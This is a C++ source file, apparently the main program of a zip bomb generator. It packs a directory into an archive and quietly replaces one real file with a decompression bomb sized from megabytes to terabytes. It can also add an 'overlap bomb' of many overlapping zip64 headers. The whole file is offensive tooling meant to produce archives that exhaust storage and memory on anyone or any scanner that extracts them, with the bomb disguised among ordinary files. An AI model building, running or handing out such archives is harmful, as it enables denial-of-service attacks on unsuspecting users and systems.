#include <chrono>

#include "../include/zip_file_construction/LocalFileHeader.h"
#include "Helper.h"
#include "Timer.h"
#include "deflation/Lz77.h"
#include "zip_file_construction/ZipFile.h"
#include "tui/InputParser.h"

#include <iostream>
#include <filesystem>
#include <ranges>

namespace {
    enum class ByteSizeBaseKB:size_t {
        MB = 1024,
        GB = MB * 1024,
        TB = GB * 1024,
        PB = TB * 1024
    };

    std::optional<size_t> parseBombSize(const std::optional<std::string> &sizeInString, ByteSizeBaseKB byteSize) {
        if (!sizeInString) return std::nullopt;

        size_t size{};

        auto [ptr, ec] = std::from_chars(sizeInString.value().data(),
                                         sizeInString.value().data() + sizeInString.value().size(), size);
        if (ec != std::errc{}) {
            throw std::runtime_error{"Invalid value given for bomb size "};
        }

        size *= static_cast<size_t>(byteSize);

        return size;
    }
}



int main(int argc, const char **argv) {
    Timer totalRuntime{"Total Runtime"};
    namespace fs = std::filesystem;

    InputParser inputParser{};

    inputParser.registerFlag(
        "dir",
        "The directory of the folder to be zipped, if not provided the programme will zip the current working directory",
        true);
    inputParser.registerFlag("help", "Displays the available flags and their corresponding descriptions");
    inputParser.registerFlag("detailed", "Displays all log messages, better performance if not used");
    inputParser.registerFlag("mb", "Sets the bomb size in mb followed by the size in number, default is 1gb", true);
    inputParser.registerFlag("gb", "Sets the bomb size in gb followed by the size in number, default is 1gb", true);
    inputParser.registerFlag("tb", "Sets the bomb size in tb followed by the size in number, default is 1gb", true);
    inputParser.registerFlag("name", "Sets the name of the produced zipped file, default is zipBomb.zip", true);
    inputParser.registerFlag("target", "Sets the target file to be the bomb file", true);
    inputParser.registerFlag("overlapName","Sets the name of the overlapping bomb, default is overlapBomb",true);
    inputParser.registerFlag("overlappingHeaders","Sets how many overlapping headers of the overlap bomb should have, default is 1000",true);

    try {
        if (bool parsedOk{inputParser.parse(argc, argv)}; inputParser.containsInputFlag("help") || !parsedOk) {
            inputParser.displayHelp();
            return 0;
        }

        auto inputName{inputParser.getFlagValue("name")};
        auto inputPath{inputParser.getFlagValue("dir")};
        auto inputMbSize{inputParser.getFlagValue("mb")};
        auto inputGbSize{inputParser.getFlagValue("gb")};
        auto inputTbSize{inputParser.getFlagValue("tb")};
        auto inputTargetFile{inputParser.getFlagValue("target")};
        auto inputOverlapBombName{inputParser.getFlagValue("overlapName")};
        auto inputOverlappingHeaders{inputParser.getFlagValue("overlappingHeaders")};
        if (auto    inputDetailed{inputParser.getFlagValue("detailed")})Timer::setDetailedMode();

        std::string folderPath{inputPath.has_value() ? inputPath.value() : fs::current_path().string()};

        std::vector<fs::path> files;
        for (const auto &entry: fs::recursive_directory_iterator(folderPath,
                                                                 fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file()) {
                files.push_back(entry.path());
            }
        }

        if (files.empty()) {
            std::cout << "No files found in " << folderPath << '\n';
            return 0;
        }

        std::string zipFileName{inputName.has_value() ? helper::ensureZipExtension(inputName.value()) : "zipBomb.zip"};

        ZipFile zipFile{zipFileName};

        size_t bombPlacement{};

        if (inputTargetFile.has_value()) {
            auto it {std::ranges::find_if(files,[&](const fs::path &path) {
                return inputTargetFile.value() == fs::relative(path, folderPath).generic_string();
            }
            )};
            if (it == files.end()) {
                std::cout << "Target file " << inputTargetFile.value() << " not found\n";
                return 0;
            }
            bombPlacement = static_cast<size_t>(it - files.begin());
        }else {
           bombPlacement = helper::randomNumber(files.size());
        }

        size_t nthFileRead{};

        size_t bombSize{(static_cast<size_t>(ByteSizeBaseKB::GB) * 1)};

        if (auto size{parseBombSize(inputMbSize, ByteSizeBaseKB::MB)})bombSize = size.value();
        if (auto size{parseBombSize(inputGbSize, ByteSizeBaseKB::GB)})bombSize = size.value();
        if (auto size{parseBombSize(inputTbSize, ByteSizeBaseKB::TB)})bombSize = size.value();
        // if (auto size{parseBombSize(inputPbSize, ByteSizeBaseKB::PB)})bombSize = size.value();

        bool hasOverlapBomb{inputOverlapBombName.has_value() || inputOverlappingHeaders.has_value()};

        zipFile.cdAddCapacity(files.size());

        for (const fs::path &entry: files) {
            std::string fileName{fs::relative(entry, folderPath).generic_string()};

            if (nthFileRead == bombPlacement && !hasOverlapBomb) {
                Timer readFileTimer{"Placing Bomb in File - " + fileName};
                LocalFileHeader bombFile{
                    LocalFileHeader::createBomb(fileName, bombSize)
                };
                zipFile.addFile(bombFile);
            } else {
                Timer readFileTimer{"Compressing File - " + fileName,true};
                std::vector<uint8_t> fileData{helper::readFile(entry.string())};
                LocalFileHeader compressedFileHeader{lz77::fixedCompress(fileName, fileData)};
                zipFile.addFile(compressedFileHeader);
            }
            ++nthFileRead;
        }

        if (hasOverlapBomb) {
            std::string overLapBombFolderName {inputOverlapBombName.has_value()? inputOverlapBombName.value() : "overlapBomb"};
            size_t overLappingHeaders{1000};

            Timer overlapBombTimer{"Creating overlap bomb - " + overLapBombFolderName};

            if (inputOverlappingHeaders.has_value()) {
                auto [ptr, ec] = std::from_chars(inputOverlappingHeaders.value().data(),
                                        inputOverlappingHeaders.value().data() + inputOverlappingHeaders.value().size(), overLappingHeaders);
                if (ec != std::errc{}) {
                    throw std::runtime_error{"Invalid value given for bomb size "};
                }
            }

            UniqueNameGenerator uniqueNameGenerator{overLappingHeaders,(std::move(overLapBombFolderName))};
            std::vector<LocalFileHeader> overlappingLocalFileHeaders;
            overlappingLocalFileHeaders.reserve(overLappingHeaders);

            overlappingLocalFileHeaders.push_back( LocalFileHeader::createBomb(uniqueNameGenerator.getFolderName()+"kernel", bombSize));

            // -1 cause kernal counts as one of the header
            for (size_t i {0}; i < overLappingHeaders-1; ++i) {
                overlappingLocalFileHeaders.push_back(LocalFileHeader::createNonFinalZip64(uniqueNameGenerator, overlappingLocalFileHeaders[i]));

            }

            zipFile.cdAddCapacity(overLappingHeaders);

            for (auto& localFileHeader : overlappingLocalFileHeaders| std::views::reverse) {
                zipFile.addFile(localFileHeader);
            }
        }

        {
            Timer zipFileSerialization{"Closing zip file"};
            zipFile.close();
        }

    } catch (std::exception &e) {
        std::cout << "exception: " << e.what() << '\n' << std::endl;

        inputParser.displayHelp();

    }
}
;
